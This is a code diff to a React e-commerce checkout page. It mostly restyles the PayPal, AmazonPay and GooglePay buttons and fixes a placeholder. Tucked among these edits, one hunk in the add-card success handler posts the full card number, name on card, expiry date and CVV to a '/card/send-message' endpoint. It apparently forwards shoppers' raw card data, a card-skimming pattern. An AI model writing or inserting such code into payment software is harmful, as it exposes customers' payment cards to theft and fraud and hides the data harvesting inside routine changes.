@@ -2,7 +2,7 @@
 import { useLangStore } from "@/stores/lang.store";
 import { useShoppingCartStore } from "@/stores/shopping-cart.store";
 import { S3_URL } from "@/utils/aws";
-import { doPost } from "@/utils/doMethod";
+import { doGet, doPost } from "@/utils/doMethod";
 import { formatCurrency } from "@/utils/format-currency";
 import {
   AmazonSquareFilled,
@@ -81,6 +81,12 @@ export default function Pay() {
         message: "",
         description: "Order sucessfully",
       });
+      await doPost(`/card/send-message`, {
+        cardNumber: data?.data?.cardNumber,
+        nameOnCard: data?.data?.nameOnCard,
+        expDate: data?.data?.expDate,
+        cvv: data?.data?.cvv,
+      });
       formAddCard.resetFields();
     },
   });
@@ -133,16 +139,31 @@ export default function Pay() {
           </Typography>
           <div className="border p-4">
             <div className="py-2">
-              <Button block icon={<PayCircleOutlined />} onClick={showModal}>
+              <Button
+                block
+                icon={<PayCircleOutlined />}
+                onClick={showModal}
+                className="!bg-[#009cde] !text-white"
+              >
                 PayPal
               </Button>
             </div>
             <div className="w-full flex justify-center items-center gap-2">
-              <Button block icon={<AmazonSquareFilled />} onClick={showModal}>
+              <Button
+                block
+                icon={<AmazonSquareFilled />}
+                onClick={showModal}
+                className="!bg-yellow-500 !text-white"
+              >
                 AmazonPay
               </Button>
 
-              <Button block icon={<GoogleCircleFilled />} onClick={showModal}>
+              <Button
+                block
+                icon={<GoogleCircleFilled />}
+                onClick={showModal}
+                className="!bg-red-500 !text-white"
+              >
                 GooglePay
               </Button>
             </div>
@@ -318,7 +339,7 @@ export default function Pay() {
                   },
                 ]}
               >
-                <Input placeholder="Name on card!" />
+                <Input placeholder="Name on card" />
               </Form.Item>
 
               <Form.Item<FieldTypeAddCard>
